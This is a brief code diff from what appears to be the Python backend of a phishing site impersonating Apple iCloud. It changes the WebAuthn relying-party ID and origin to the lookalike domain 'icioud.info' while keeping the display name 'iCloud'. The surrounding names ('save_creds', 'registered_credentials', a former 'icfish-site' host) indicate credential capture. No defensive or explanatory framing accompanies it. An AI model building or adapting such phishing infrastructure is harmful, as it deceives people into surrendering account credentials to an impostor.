@@ -43,9 +43,9 @@ def save_creds():
 registered_credentials = {}
 challenge_store = {}
 
-RP_ID = "railway.app"
+RP_ID = "icioud.info"
 RP_NAME = "iCloud"
-ORIGIN = "https://icfish-site-production.up.railway.app"
+ORIGIN = "https://icioud.info"
 
 def b64encode(data):
     return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')
